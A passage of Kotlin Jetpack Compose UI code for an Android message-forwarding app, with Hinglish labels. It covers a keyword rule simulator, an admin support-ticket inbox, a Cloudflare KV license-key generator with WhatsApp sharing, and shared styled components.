                            focusedBorderColor = Color(0xFF6366F1),
                            unfocusedBorderColor = Color(0xFF334155)
                        ),
                        modifier = Modifier.weight(1f),
                        singleLine = true
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Button(
                        onClick = {
                            if (newKeyword.isNotBlank()) {
                                onAddKeyword(newKeyword.trim())
                                newKeyword = ""
                            }
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF4F46E5)),
                        shape = RoundedCornerShape(10.dp),
                        modifier = Modifier.height(56.dp)
                    ) {
                        Text("+ Add", fontWeight = FontWeight.Bold, fontSize = 12.sp)
                    }
                }

                Spacer(modifier = Modifier.height(14.dp))

                // Keywords chips
                if (keywordsList.isEmpty()) {
                    Text("Koi keyword nahi hai (Forward ALL ON karein ya preset load karein)", fontSize = 11.sp, color = Color(0xFF64748B))
                } else {
                    Column(verticalArrangement = Arrangement.spacedBy(6.dp)) {
                        keywordsList.chunked(3).forEach { rowKeywords ->
                            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                                rowKeywords.forEach { kw ->
                                    Surface(
                                        color = Color(0xFF1E293B),
                                        shape = RoundedCornerShape(8.dp),
                                        border = BorderStroke(1.dp, Color(0xFF334155))
                                    ) {
                                        Row(
                                            modifier = Modifier.padding(horizontal = 8.dp, vertical = 6.dp),
                                            verticalAlignment = Alignment.CenterVertically
                                        ) {
                                            Text(kw, fontSize = 11.sp, color = Color(0xFFA5B4FC), fontWeight = FontWeight.SemiBold)
                                            Spacer(modifier = Modifier.width(6.dp))
                                            Text(
                                                "✕",
                                                fontSize = 11.sp,
                                                color = Color(0xFFEF4444),
                                                modifier = Modifier.clickable { onRemoveKeyword(kw) }
                                            )
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        // Test Rule Simulator
        Surface(
            modifier = Modifier.fillMaxWidth(),
            color = Color(0xFF131B2E),
            shape = RoundedCornerShape(16.dp),
            border = BorderStroke(1.dp, Color(0xFF1E293B))
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text("🧪 Rule Filter Simulator", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = Color(0xFF38BDF8))
                Text("Kisi bhi message ko test karein ki forwarder use pakadta hai ya nahi:", fontSize = 11.sp, color = Color(0xFF94A3B8))
                Spacer(modifier = Modifier.height(10.dp))

                OutlinedTextField(
                    value = testSender,
                    onValueChange = { testSender = it },
                    label = { Text("Sender ID", fontSize = 10.sp, color = Color(0xFF64748B)) },
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedContainerColor = Color(0xFF0F172A),
                        unfocusedContainerColor = Color(0xFF0F172A),
                        focusedTextColor = Color.White,
                        unfocusedTextColor = Color.White,
                        focusedBorderColor = Color(0xFF6366F1),
                        unfocusedBorderColor = Color(0xFF334155)
                    ),
                    shape = RoundedCornerShape(10.dp),
                    modifier = Modifier.fillMaxWidth(),
                    singleLine = true
                )
                Spacer(modifier = Modifier.height(8.dp))
                OutlinedTextField(
                    value = testBody,
                    onValueChange = { testBody = it },
                    label = { Text("Message Body", fontSize = 10.sp, color = Color(0xFF64748B)) },
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedContainerColor = Color(0xFF0F172A),
                        unfocusedContainerColor = Color(0xFF0F172A),
                        focusedTextColor = Color.White,
                        unfocusedTextColor = Color.White,
                        focusedBorderColor = Color(0xFF6366F1),
                        unfocusedBorderColor = Color(0xFF334155)
                    ),
                    shape = RoundedCornerShape(10.dp),
                    modifier = Modifier.fillMaxWidth(),
                    singleLine = true
                )
                Spacer(modifier = Modifier.height(10.dp))
                Button(
                    onClick = {
                        val matches = KeywordManager.matches(context, testSender, testBody)
                        testVerdict = if (matches) "🟢 PASS: Yeh message match hoga aur FORWARD hoga!" else "🔴 BLOCKED: Rules filter ise ignore kar dega."
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF0284C7)),
                    shape = RoundedCornerShape(10.dp),
                    modifier = Modifier.fillMaxWidth().height(44.dp)
                ) {
                    Text("Check Rule Match", fontWeight = FontWeight.Bold, fontSize = 12.sp)
                }
                if (testVerdict.isNotEmpty()) {
                    Spacer(modifier = Modifier.height(8.dp))
                    Text(testVerdict, fontSize = 11.sp, fontWeight = FontWeight.Bold, color = if (testVerdict.startsWith("🟢")) Color(0xFF34D399) else Color(0xFFF87171))
                }
            }
        }
    }
}

@Composable
fun FounderSupportTab(
    context: Context,
    messagesList: List<SupportMessage>,
    onRefreshMessages: () -> Unit
) {
    val scope = rememberCoroutineScope()
    var targetDeviceId by remember { mutableStateOf("") }
    var replyText by remember { mutableStateOf("") }
    var isSendingReply by remember { mutableStateOf(false) }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState()),
        verticalArrangement = Arrangement.spacedBy(14.dp)
    ) {
        // Support Header Card
        Surface(
            modifier = Modifier.fillMaxWidth(),
            color = Color(0xFF131B2E),
            shape = RoundedCornerShape(16.dp),
            border = BorderStroke(1.dp, Color(0xFF1E293B))
        ) {
            Row(
                modifier = Modifier.fillMaxWidth().padding(16.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Column {
                    Text("💬 Customer Tickets Inbox", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color(0xFFFBBF24))
                    Text("${messagesList.size} Total Message(s) received", fontSize = 11.sp, color = Color(0xFF94A3B8))
                }
                if (messagesList.isNotEmpty()) {
                    OutlinedButton(
                        onClick = {
                            SupportChatManager.clearChat(context)
                            onRefreshMessages()
                            Toast.makeText(context, "Tickets Cleared", Toast.LENGTH_SHORT).show()
                        },
                        border = BorderStroke(1.dp, Color(0xFFEF4444)),
                        shape = RoundedCornerShape(8.dp),
                        contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp)
                    ) {
                        Text("Clear All", fontSize = 11.sp, color = Color(0xFFEF4444))
                    }
                }
            }
        }

        // Messages List Container
        if (messagesList.isEmpty()) {
            Surface(
                modifier = Modifier.fillMaxWidth(),
                color = Color(0xFF131B2E),
                shape = RoundedCornerShape(16.dp),
                border = BorderStroke(1.dp, Color(0xFF1E293B))
            ) {
                Column(
                    modifier = Modifier.fillMaxWidth().padding(32.dp),
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Text("📭", fontSize = 36.sp)
                    Spacer(modifier = Modifier.height(8.dp))
                    Text("Abhi koi naya customer support ticket nahi hai.", fontSize = 13.sp, color = Color(0xFF94A3B8), textAlign = TextAlign.Center)
                    Text("Jab koi customer app se message ya screenshot bhejega, to yahan dikhega.", fontSize = 11.sp, color = Color(0xFF64748B), textAlign = TextAlign.Center)
                }
            }
        } else {
            Column(verticalArrangement = Arrangement.spacedBy(10.dp)) {
                messagesList.forEach { msg ->
                    val isCustomer = msg.sender == "USER"
                    val isBlocked = SupportChatManager.isUserBlocked(context, msg.deviceId)

                    Surface(
                        modifier = Modifier.fillMaxWidth(),
                        color = if (isCustomer) Color(0xFF1E293B) else Color(0xFF1E1B4B),
                        shape = RoundedCornerShape(14.dp),
                        border = BorderStroke(1.dp, if (isCustomer) Color(0xFF334155) else Color(0xFF4F46E5))
                    ) {
                        Column(modifier = Modifier.padding(14.dp)) {
                            Row(
                                modifier = Modifier.fillMaxWidth(),
                                verticalAlignment = Alignment.CenterVertically,
                                horizontalArrangement = Arrangement.SpaceBetween
                            ) {
                                Row(verticalAlignment = Alignment.CenterVertically) {
                                    Surface(
                                        color = if (isCustomer) Color(0xFF0F766E) else Color(0xFF4338CA),
                                        shape = RoundedCornerShape(6.dp)
                                    ) {
                                        Text(
                                            if (isCustomer) "👤 Customer (${msg.deviceId.take(8)})" else "👑 You (Admin)",
                                            fontSize = 10.sp,
                                            fontWeight = FontWeight.Bold,
                                            color = Color.White,
                                            modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp)
                                        )
                                    }
                                    if (isBlocked) {
                                        Spacer(modifier = Modifier.width(6.dp))
                                        Surface(color = Color(0xFF7F1D1D), shape = RoundedCornerShape(4.dp)) {
                                            Text("BLOCKED", fontSize = 9.sp, fontWeight = FontWeight.Bold, color = Color(0xFFFCA5A5), modifier = Modifier.padding(horizontal = 4.dp, vertical = 1.dp))
                                        }
                                    }
                                }

                                Row(horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                                    if (isCustomer) {
                                        Button(
                                            onClick = { targetDeviceId = msg.deviceId },
                                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF3B82F6)),
                                            shape = RoundedCornerShape(6.dp),
                                            contentPadding = PaddingValues(horizontal = 8.dp, vertical = 3.dp),
                                            modifier = Modifier.height(28.dp)
                                        ) {
                                            Text("↩️ Reply", fontSize = 10.sp, fontWeight = FontWeight.Bold)
                                        }

                                        Button(
                                            onClick = {
                                                val newBlocked = !isBlocked
                                                SupportChatManager.setUserBlocked(context, msg.deviceId, newBlocked)
                                                onRefreshMessages()
                                                Toast.makeText(context, if (newBlocked) "User Blocked" else "User Unblocked", Toast.LENGTH_SHORT).show()
                                            },
                                            colors = ButtonDefaults.buttonColors(containerColor = if (isBlocked) Color(0xFF059669) else Color(0xFFDC2626)),
                                            shape = RoundedCornerShape(6.dp),
                                            contentPadding = PaddingValues(horizontal = 8.dp, vertical = 3.dp),
                                            modifier = Modifier.height(28.dp)
                                        ) {
                                            Text(if (isBlocked) "Unblock" else "🚫 Block", fontSize = 10.sp)
                                        }
                                    }

                                    Button(
                                        onClick = {
                                            SupportChatManager.deleteMessage(context, msg.id)
                                            onRefreshMessages()
                                            Toast.makeText(context, "Deleted", Toast.LENGTH_SHORT).show()
                                        },
                                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF475569)),
                                        shape = RoundedCornerShape(6.dp),
                                        contentPadding = PaddingValues(horizontal = 8.dp, vertical = 3.dp),
                                        modifier = Modifier.height(28.dp)
                                    ) {
                                        Text("🗑️", fontSize = 10.sp)
                                    }
                                }
                            }

                            if (!msg.mediaName.isNullOrEmpty()) {
                                Spacer(modifier = Modifier.height(6.dp))
                                Surface(
                                    color = Color(0xFF0F172A),
                                    shape = RoundedCornerShape(6.dp),
                                    border = BorderStroke(1.dp, Color(0xFF334155))
                                ) {
                                    Text(
                                        "📎 ${msg.mediaType ?: "ATTACHMENT"}: ${msg.mediaName}",
                                        fontSize = 11.sp,
                                        color = Color(0xFF67E8F9),
                                        modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp)
                                    )
                                }
                            }

                            if (msg.text.isNotEmpty()) {
                                Spacer(modifier = Modifier.height(8.dp))
                                Text(
                                    text = msg.text,
                                    fontSize = 13.sp,
                                    color = Color.White,
                                    lineHeight = 18.sp
                                )
                            }
                        }
                    }
                }
            }
        }

        // Executive Reply Composer Card
        Surface(
            modifier = Modifier.fillMaxWidth(),
            color = Color(0xFF131B2E),
            shape = RoundedCornerShape(16.dp),
            border = BorderStroke(1.dp, Color(0xFF312E81))
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text("✉️ Send Reply to Customer", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = Color(0xFFA5B4FC))
                Text("Customer ke app me live support chat me turant reply jayega:", fontSize = 11.sp, color = Color(0xFF94A3B8))
                Spacer(modifier = Modifier.height(12.dp))

                OutlinedTextField(
                    value = targetDeviceId,
                    onValueChange = { targetDeviceId = it },
                    label = { Text("Customer Device ID", fontSize = 11.sp, color = Color(0xFF94A3B8)) },
                    placeholder = { Text("Enter or select customer Device ID", fontSize = 11.sp, color = Color(0xFF64748B)) },
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedContainerColor = Color(0xFF0F172A),
                        unfocusedContainerColor = Color(0xFF0F172A),
                        focusedTextColor = Color.White,
                        unfocusedTextColor = Color.White,
                        focusedBorderColor = Color(0xFF6366F1),
                        unfocusedBorderColor = Color(0xFF334155)
                    ),
                    shape = RoundedCornerShape(10.dp),
                    modifier = Modifier.fillMaxWidth(),
                    singleLine = true
                )

                Spacer(modifier = Modifier.height(10.dp))

                OutlinedTextField(
                    value = replyText,
                    onValueChange = { replyText = it },
                    label = { Text("Reply Message", fontSize = 11.sp, color = Color(0xFF94A3B8)) },
                    placeholder = { Text("Customer ko sandesh likhein...", fontSize = 11.sp, color = Color(0xFF64748B)) },
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedContainerColor = Color(0xFF0F172A),
                        unfocusedContainerColor = Color(0xFF0F172A),
                        focusedTextColor = Color.White,
                        unfocusedTextColor = Color.White,
                        focusedBorderColor = Color(0xFF6366F1),
                        unfocusedBorderColor = Color(0xFF334155)
                    ),
                    shape = RoundedCornerShape(10.dp),
                    modifier = Modifier.fillMaxWidth(),
                    singleLine = true
                )

                Spacer(modifier = Modifier.height(12.dp))

                Button(
                    onClick = {
                        if (replyText.isNotBlank()) {
                            scope.launch {
                                isSendingReply = true
                                val devId = if (targetDeviceId.isNotBlank()) targetDeviceId.trim() else CloudflareLicenseManager.getDeviceId(context)
                                val res = SupportChatManager.sendAdminReply(context, devId, replyText.trim())
                                if (res.first) {
                                    replyText = ""
                                    onRefreshMessages()
                                    Toast.makeText(context, "✅ Reply Sent to Customer!", Toast.LENGTH_SHORT).show()
                                } else {
                                    Toast.makeText(context, "❌ Reply Failed: ${res.second}", Toast.LENGTH_LONG).show()
                                }
                                isSendingReply = false
                            }
                        }
                    },
                    enabled = !isSendingReply && replyText.isNotBlank(),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF059669)),
                    shape = RoundedCornerShape(10.dp),
                    modifier = Modifier.fillMaxWidth().height(48.dp)
                ) {
                    Text(if (isSendingReply) "Sending..." else "➤ Send Reply to Customer", fontWeight = FontWeight.Bold, fontSize = 13.sp)
                }
            }
        }
    }
}

@Composable
fun FounderLicenseTab(
    context: Context,
    generatedKey: String,
    isGenerating: Boolean,
    onGenerateKey: () -> Unit
) {
    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState()),
        verticalArrangement = Arrangement.spacedBy(14.dp)
    ) {
        // Generator Card
        Surface(
            modifier = Modifier.fillMaxWidth(),
            color = Color(0xFF131B2E),
            shape = RoundedCornerShape(16.dp),
            border = BorderStroke(1.dp, Color(0xFF312E81))
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text("🔑 Cloudflare KV Pro Key Generator", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color(0xFFFBBF24))
                Text("Grahak ke liye instant 16-digit Lifetime Pro activation key generate karein:", fontSize = 11.sp, color = Color(0xFF94A3B8))
                Spacer(modifier = Modifier.height(14.dp))

                Button(
                    onClick = onGenerateKey,
                    enabled = !isGenerating,
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF4F46E5)),
                    shape = RoundedCornerShape(10.dp),
                    modifier = Modifier.fillMaxWidth().height(48.dp)
                ) {
                    Text(if (isGenerating) "Connecting to Cloudflare KV..." else "✨ Generate New Lifetime Pro Key", fontWeight = FontWeight.Bold, fontSize = 13.sp)
                }

                if (generatedKey.isNotEmpty()) {
                    Spacer(modifier = Modifier.height(14.dp))
                    Surface(
                        color = Color(0xFF1E1B4B),
                        shape = RoundedCornerShape(12.dp),
                        border = BorderStroke(2.dp, Color(0xFFF59E0B)),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Column(modifier = Modifier.padding(14.dp)) {
                            Text("PRO LICENSE KEY CREATED:", fontSize = 10.sp, fontWeight = FontWeight.Bold, color = Color(0xFFFDE68A))
                            Spacer(modifier = Modifier.height(4.dp))
                            Text(generatedKey, fontWeight = FontWeight.ExtraBold, fontSize = 17.sp, color = Color.White)
                            Spacer(modifier = Modifier.height(12.dp))

                            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                                Button(
                                    onClick = {
                                        val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                                        clipboard.setPrimaryClip(ClipData.newPlainText("License", generatedKey))
                                        Toast.makeText(context, "Key Copied to Clipboard!", Toast.LENGTH_SHORT).show()
                                    },
                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF312E81)),
                                    shape = RoundedCornerShape(8.dp),
                                    modifier = Modifier.weight(1f).height(42.dp)
                                ) {
                                    Text("📋 Copy Key", fontSize = 12.sp)
                                }

                                Button(
                                    onClick = {
                                        try {
                                            val shareText = "Hello! Aapki Smart Notifier Lifetime Pro License Key hai:\n\n$generatedKey\n\nApp kholkar 'Lifetime Pro' me jakar ye key paste karein aur 'Activate Pro' dabayein."
                                            val intent = Intent(Intent.ACTION_SEND).apply {
                                                type = "text/plain"
                                                putExtra(Intent.EXTRA_TEXT, shareText)
                                            }
                                            context.startActivity(Intent.createChooser(intent, "Share License Key via WhatsApp"))
                                        } catch (e: Exception) {
                                            Toast.makeText(context, "Share error", Toast.LENGTH_SHORT).show()
                                        }
                                    },
                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF059669)),
                                    shape = RoundedCornerShape(8.dp),
                                    modifier = Modifier.weight(1f).height(42.dp)
                                ) {
                                    Text("📲 WhatsApp Share", fontSize = 12.sp, fontWeight = FontWeight.Bold)
                                }
                            }
                        }
                    }
                }
            }
        }

        // Instructions
        Surface(
            modifier = Modifier.fillMaxWidth(),
            color = Color(0xFF131B2E),
            shape = RoundedCornerShape(16.dp),
            border = BorderStroke(1.dp, Color(0xFF1E293B))
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text("📖 License Activation Process:", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = Color(0xFF38BDF8))
                Spacer(modifier = Modifier.height(8.dp))
                Text("1. Customer se ₹199 PayTM/UPI lene ke baad yahan se New Key generate karein.", fontSize = 11.sp, color = Color(0xFFCBD5E1))
                Spacer(modifier = Modifier.height(4.dp))
                Text("2. 'WhatsApp Share' dabakar seedhe grahak ke phone par bhej dein.", fontSize = 11.sp, color = Color(0xFFCBD5E1))
                Spacer(modifier = Modifier.height(4.dp))
                Text("3. Grahak jab app me key dalega, Cloudflare KV use turant verify karke Lifetime Pro on kar dega.", fontSize = 11.sp, color = Color(0xFFCBD5E1))
            }
        }
    }
}

@Composable
fun MncCard(
    modifier: Modifier = Modifier,
    content: @Composable ColumnScope.() -> Unit
) {
    Card(
        modifier = modifier.fillMaxWidth(),
        shape = RoundedCornerShape(16.dp),
        colors = CardDefaults.cardColors(containerColor = CardBg),
        border = BorderStroke(1.dp, CardBorder),
        elevation = CardDefaults.cardElevation(defaultElevation = 2.dp),
        content = content
    )
}

@Composable
fun MncTextField(
    value: String,
    onValueChange: (String) -> Unit,
    label: String
) {
    OutlinedTextField(
        value = value,
        onValueChange = onValueChange,
        label = { Text(label, fontSize = 11.sp, color = TextMuted) },
        shape = RoundedCornerShape(10.dp),
        colors = OutlinedTextFieldDefaults.colors(
            focusedTextColor = TextPrimary,
            unfocusedTextColor = TextPrimary,
            focusedBorderColor = AccentIndigo,
            unfocusedBorderColor = CardBorder,
            focusedContainerColor = Color(0xFF0B101D),
            unfocusedContainerColor = Color(0xFF0B101D)
        ),
        modifier = Modifier.fillMaxWidth(),
        singleLine = true
    )
}

@Composable
fun SettingToggleRow(
    title: String,
    checked: Boolean,
    onCheckedChange: (Boolean) -> Unit
) {
    Row(
        modifier = Modifier.fillMaxWidth(),
        verticalAlignment = Alignment.CenterVertically,
        horizontalArrangement = Arrangement.SpaceBetween
    ) {
        Text(title, fontWeight = FontWeight.SemiBold, fontSize = 13.sp, color = TextPrimary)
        Switch(
            checked = checked,
            onCheckedChange = onCheckedChange,
            colors = SwitchDefaults.colors(
                checkedThumbColor = Color.White,
                checkedTrackColor = AccentIndigo,
                uncheckedThumbColor = Color.Gray,
                uncheckedTrackColor = Color(0xFF1E293B)
            )
        )
    }
}

@Composable
fun MncStatusBadge(label: String, status: String) {
    val bg = when (status) {
        "Sent" -> Color(0xFF064E3B)
        "Failed", "Error" -> Color(0xFF450A0A)
        else -> Color(0xFF1F2937)
    }
    val fg = when (status) {
        "Sent" -> Color(0xFF6EE7B7)
        "Failed", "Error" -> Color(0xFFFCA5A5)
        else -> TextMuted
    }
    Surface(
        color = bg,
        shape = RoundedCornerShape(4.dp),
        border = BorderStroke(1.dp, fg.copy(alpha = 0.3f)),
        modifier = Modifier.padding(vertical = 2.dp)
    ) {
        Text(
            text = "$label: $status",
            fontSize = 9.sp,
            fontWeight = FontWeight.SemiBold,
            color = fg,
            modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp)
        )
    }
}
